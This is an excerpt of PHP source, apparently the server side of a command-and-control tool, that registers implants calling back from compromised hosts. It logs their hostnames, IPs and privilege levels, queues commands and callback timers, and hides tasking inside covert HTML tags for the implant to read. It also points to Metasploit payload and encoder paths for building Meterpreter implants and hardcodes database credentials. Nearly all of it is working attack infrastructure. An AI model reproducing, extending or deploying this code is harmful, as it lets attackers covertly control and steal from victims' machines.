...
class DB {
  // initial connection
  public static $dbName = 'throwbackcp';
  public static $user = 'tblp';
  public static $password = 'ThrowbackPwnage!@#';
...
$BADCHAR = '+'; 
$MSFPAYLOAD = '/opt/metasploit/msfpayload'; //PATH TO MSFPAYLOAD
$MSFENCODE = '/opt/metasploit/msfencode'; //PATH TO MSFENCODE
$OUTPUTDIR = '/var/www/down/'; //OUTPUT DIRECTORY FOR METERPRETER CREATOR
...
if(isset($_POST['pd']) || isset($_POST['SESSION']))
{
    ...
    if(isset($POST['enc']))
    {
        if($POST['enc'] == $POSTKEY)
        {
            ...
            if(isset($POST['pk']))
            {
                //POSTING THE RESULTS FROM PREVIOUS COMMAND
                if($POST['pk'] != '')
                {
                    $lastupdate = time();
                    $externalip = $_SERVER['REMOTE_ADDR'];
                    
                    //PK IS THE UNIQUE KEY FOR THIS TASK
                    $pk = $POST['pk'];
                    ...
                    //CONCAT ID TO BE ID + HOSTNAME - SOMETIMES THE MACHINEGUID IS THE SAME FOR MULTIPLE TARGETS IF THEY ARE CLONED
                    $id = $POST['id'];
                    ...
                    DB::update('tasks', array('results' => $res, 'status' => '2', 'closetime' => $lastupdate), '`id`=%s AND `key`=%s', $id, $pk);
                }
            }
            else
            {
                ...
                //IF CB IS SET, THEN IMPLANT NEEDS THE CALLBACK PERIOD
                if(isset($POST['cb'])) $cb = $POST['cb'];
                
                //IF PP IS SET, THEN THE IMPLANT HAS SYSTEM PRIVS
                if(isset($POST['pp'])) $privs = $POST['pp'];
                
                //IF PE IS SET, THE PROXY IS ENABLED ON TARGET
                if(isset($POST['pe'])) $proxy = $POST['pe'];
                ...
                //TO VIEW ALL SQL STATEMENTS IN HTML ENABLE!!
                //DB::debugMode();
                
                //DETERMINE IF TARGET ALREADY EXISTS IN PARAMETERS TABLE
                $result = DB::query('SELECT * FROM parameters WHERE `id`=%s', $id);
                $count = DB::count();
                
                //ADD NEW TARGET IF COUNT IS 0
                if($count == 0)
                {
                    //ADD TARGET TO PARAMETERS TABLE
                    DB::insert('parameters', array('id' => $id, 'cbperiod' => $DEFAULTCB, 'lastupdate' => $lastupdate, 'name' => $hostname,  'hostname' => $hostname, 'privileges' => $privs, 'version' => $version, 'ipaddress' => $externalip, 'proxyenabled' => $proxy));
                }
                else
                {
                    //UPDATE PARAMETERS TABLE
                    DB::update('parameters', array('lastupdate' => $lastupdate, 'privileges' => $privs, 'version' => $version, 'ipaddress' => $externalip, 'proxyenabled' => $proxy), '`id`=%s', $id);
                }
            
                //ADD ALL CB ENTRIES TO TARGETS TABLE
                DB::insert('targets', array('id' => $id, 'externalip' => $externalip, 'hostname' => $hostname, 'lastupdate' => $lastupdate));
                
                //FIRST TIME CALLING BACK, MUST SET CB TIMEOUT FOR IMPLANT
                if($cb == 1)
                {
                    //CHECK IF EXISTING CB CHANGE IS QUEUED - IF SO, DON'T QUEUE ANOTHER
                    DB::query('SELECT * FROM tasks WHERE `status`=%s AND `type`=%s AND `id`=%s', '0', '5', $id);
                    $count = DB::count();
                    
                    if($count == 0)
                    {
                        //QUERY FOR CURRENT CB TIMEOUT
                        $result = DB::query('SELECT `cbperiod` FROM parameters WHERE `id`=%s', $id);
                        $count = DB::count();
                        $key = base64_encode(time());
                        $opentime = time();
                        
                        //IF ITS NOT IN DB, USE THE DEFAULT CB TIMEOUT
                        if($count == 1)
                        {
                            DB::insert('tasks', array('type' => '5', 'id' => $id, 'command' => $result[0]['cbperiod'], 'arguments' => '', 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
                            
                        }
                        else
                        {
                            DB::insert('tasks', array('type' => '5', 'id' => $id, 'command' => $DEFAULTCB, 'arguments' => '', 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
                        }
                    }
                }
                
                //CHECK TASKING DB
                $row = DB::query('SELECT * FROM tasks WHERE `id`=%s AND status = %s ORDER BY `opentime` ASC', $id, '0');
                $count = DB::count();
    
                //IF TASKING IS AVAILABLE, THEN QUEUE IT 
                if($count == 1)
                {
                    //PRINT HIDDEN TAG WITH EMBEDDED COMMAND
                    $key = $row[0]['key'];
                    if($client == 0)
                    {
                        print "<hidden " . $HTMLKEY . " " .  $row[0]['type'] . $DELIMITER1 . $row[0]['key'] . $DELIMITER1 . $row[0]['command'] . $DELIMITER1 . $row[0]['arguments'] . $DELIMITER1 . $row[0]['runas'] . $DELIMITER1 . "0" . $DELIMITER1 . " >";
                    }
                    elseif($client == 1)
                    {
                        print "<div style='display: none;' id='bottom-block'>" . $HTMLKEY . " " .  $row[0]['type'] . $DELIMITER2 . $row[0]['key'] . $DELIMITER2 . $row[0]['command'] . $DELIMITER2 . $row[0]['arguments'] . $DELIMITER2 . $row[0]['runas'] . $DELIMITER2 . "0" . $DELIMITER2 . "</div>";
                    }
                }
                //IF MORE THAN 1 TASKING, THEN ADD EXTRA FIELD FOR QUICK CALLBACK AGAIN
                else if($count > 1)
                {
                    //PRINT HIDDEN TAG WITH EXTRA FIELD FOR QUICK CALLBACK
                    $key = $row[0]['key'];
                    if($client == 0)
                    {
                        print "<hidden " . $HTMLKEY . " " .  $row[0]['type'] . $DELIMITER1 . $row[0]['key'] . $DELIMITER1 . $row[0]['command'] . $DELIMITER1 . $row[0]['arguments'] . $DELIMITER1 . $row[0]['runas'] . $DELIMITER1 . "1" . $DELIMITER1 . " >";
                    }
                    elseif($client == 1)
                    {
                        print "<div style='display: none;' id='bottom-block'>" . $HTMLKEY . " " .  $row[0]['type'] . $DELIMITER2 . $row[0]['key'] . $DELIMITER2 . $row[0]['command'] . $DELIMITER2 . $row[0]['arguments'] . $DELIMITER2 . $row[0]['runas'] . $DELIMITER2 . "1" . $DELIMITER2 . "</div>";
                    }
                ...
                {
                    print "<hidden stup1fy 0///// >";
                }
                
                //IF COMMAND TYPE IS CHANGE CB TIMEOUT THEN UPDATE THE PARAMETERS TABLE
                if($row[0]['type'] == '5')
                {
                    DB::update('parameters', array('cbperiod' => $row[0]['command']), "`id`=%s", $id);
                }
                
                //STATUS STARTS AT 0, GOES TO 1 AFTER IT IS SENT, THEN TO 2 AFTER THE RESULT IS RETURNED
                DB::update('tasks', array('status' => '1', 'closetime' => time()), '`key`=%s', $key);
            }
        }
    }
}
